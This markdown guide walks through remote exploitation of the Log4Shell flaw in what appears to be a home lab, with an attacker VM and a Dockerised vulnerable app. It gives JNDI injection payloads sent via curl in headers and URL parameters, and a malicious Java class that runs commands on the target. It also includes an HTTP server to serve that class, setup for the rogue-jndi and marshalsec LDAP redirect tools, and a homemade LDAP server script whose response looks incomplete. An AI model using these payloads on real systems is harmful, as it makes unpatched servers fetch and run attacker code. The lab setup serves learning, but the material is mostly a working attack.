# Remote Log4Shell Exploitation Guide

## Problem
When attacking remotely, the vulnerable application cannot resolve hostnames like `attacker.local`, causing JNDI lookups to fail.

## Solutions

### Solution 1: Use IP Address Instead of Hostname (RECOMMENDED)

Replace `attacker.local` with your attacker machine's IP address:

```bash
# From attacker machine (10.0.0.8 in your case)
curl -H "User-Agent: \${jndi:ldap://10.0.0.8:1389/Exploit}" http://10.0.0.13:8081
```

### Solution 2: Set Up LDAP Server on Attacker Machine

Run the LDAP exploit server directly on your Parrot OS attacker machine:

```bash
# On Parrot OS (10.0.0.8)
# Install requirements
sudo apt update
sudo apt install python3 python3-pip openjdk-8-jdk
pip3 install twisted

# Create exploit server
mkdir ~/log4shell-exploit
cd ~/log4shell-exploit

# Download or create the LDAP server script
# Copy from the Docker container or use existing exploit tools
```

### Solution 3: Use Existing Exploitation Frameworks

#### Using Rogue-JNDI
```bash
# On attacker machine
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
java -jar target/RogueJndi-1.1.jar --command "calc.exe" --hostname "10.0.0.8"
```

#### Using marshalsec
```bash
# On attacker machine
git clone https://github.com/mbechler/marshalsec
cd marshalsec
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.0.0.8:8000/#Exploit"
```

### Solution 4: Configure Hosts File (Alternative)

Add attacker hostname to the vulnerable machine's hosts file:

```bash
# On vulnerable machine (inside Docker container)
docker exec -it log4shell-simple /bin/bash
echo "10.0.0.8 attacker.local" >> /etc/hosts
```

## Complete Remote Attack Setup

### Step 1: Prepare Attacker Machine (Parrot OS - 10.0.0.8)

```bash
# Create working directory
mkdir ~/log4shell-attack && cd ~/log4shell-attack

# Create malicious Java payload
cat > Exploit.java << 'EOF'
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("calc.exe");
            // For Linux: Runtime.getRuntime().exec("touch /tmp/pwned.txt");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
EOF

# Compile with Java 8
javac -target 8 -source 8 Exploit.java

# Start HTTP server to serve the compiled class
python3 -m http.server 8000
```

### Step 2: Start LDAP Server (Another Terminal on Attacker)

```bash
# Create LDAP server script
cat > ldap_server.py << 'EOF'
#!/usr/bin/env python3
from twisted.internet import reactor, protocol
from twisted.protocols.basic import LineReceiver
import struct

class LDAPServer(protocol.Protocol):
    def connectionMade(self):
        print(f"[+] Connection from {self.transport.getPeer()}")

    def dataReceived(self, data):
        print(f"[*] Received {len(data)} bytes")
        # Send LDAP response redirecting to HTTP server
        response = self.build_ldap_response()
        self.transport.write(response)
        self.transport.loseConnection()

    def build_ldap_response(self):
        # Minimal LDAP response pointing to HTTP server
        # This is a simplified response - adjust based on your needs
        attacker_ip = "10.0.0.8"
        http_port = "8000"
        payload_url = f"http://{attacker_ip}:{http_port}/#Exploit"

        # Build LDAP search result response
        # (Simplified - real implementation would be more complex)
        return b"\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00"

class LDAPFactory(protocol.Factory):
    def buildProtocol(self, addr):
        return LDAPServer()

if __name__ == "__main__":
    print("[*] Starting LDAP server on port 1389...")
    reactor.listenTCP(1389, LDAPFactory())
    reactor.run()
EOF

# Run LDAP server
sudo python3 ldap_server.py
```

### Step 3: Execute the Attack

```bash
# From attacker machine or any machine with network access
curl -H "User-Agent: \${jndi:ldap://10.0.0.8:1389/Exploit}" http://10.0.0.13:8081

# Or use other headers
curl -H "X-Api-Version: \${jndi:ldap://10.0.0.8:1389/Exploit}" http://10.0.0.13:8081

# Or in URL parameters
curl "http://10.0.0.13:8081/?search=\${jndi:ldap://10.0.0.8:1389/Exploit}"
```

## Network Requirements

1. **Port Access**: Ensure these ports are accessible:
   - Target application: 8081 (or whatever port the app uses)
   - LDAP server: 1389 (on attacker machine)
   - HTTP server: 8000 (on attacker machine)

2. **Firewall Rules**: Check firewall settings:
   ```bash
   # On attacker machine (Linux)
   sudo iptables -L
   sudo ufw status

   # Open required ports if needed
   sudo ufw allow 1389/tcp
   sudo ufw allow 8000/tcp
   ```

3. **Network Connectivity**: Test connectivity:
   ```bash
   # From victim to attacker
   ping 10.0.0.8
   nc -zv 10.0.0.8 1389
   nc -zv 10.0.0.8 8000

   # From attacker to victim
   ping 10.0.0.13
   nc -zv 10.0.0.13 8081
   ```

## Troubleshooting

### Issue: "UnknownHostException: attacker.local"
**Solution**: Use IP address instead of hostname in JNDI string

### Issue: "Connection refused" on port 1389
**Solution**:
- Check if LDAP server is running
- Verify firewall rules
- Use netstat to confirm listening: `netstat -tlnp | grep 1389`

### Issue: No callback received
**Solution**:
- Check network connectivity between machines
- Verify Java version is vulnerable (< 2.15.0)
- Check application logs for JNDI lookup attempts
- Ensure LDAP response includes correct HTTP server URL

## Working Example Commands

Based on your network setup:
- **Attacker (Parrot OS)**: 10.0.0.8
- **Vulnerable App**: 10.0.0.13:8081

```bash
# From attacker machine
curl -H "User-Agent: \${jndi:ldap://10.0.0.8:1389/Exploit}" http://10.0.0.13:8081

# From Windows host
curl -H "User-Agent: ${jndi:ldap://10.0.0.8:1389/Exploit}" http://10.0.0.13:8081

# Using Docker container's LDAP server (if accessible)
curl -H "User-Agent: \${jndi:ldap://10.0.0.13:1389/Exploit}" http://10.0.0.13:8081
```

## Quick Fix for Your Current Setup

Since your Docker LDAP server is working locally, expose it properly:

```bash
# Modify docker-compose-simple.yml to expose LDAP port
# Add under ldap-exploit-server service:
ports:
  - "1389:1389"
  - "8888:8888"

# Restart containers
docker-compose -f docker-compose-simple.yml down
docker-compose -f docker-compose-simple.yml up -d

# Now attack using the VM's IP
curl -H "User-Agent: \${jndi:ldap://10.0.0.13:1389/Exploit}" http://10.0.0.13:8081
```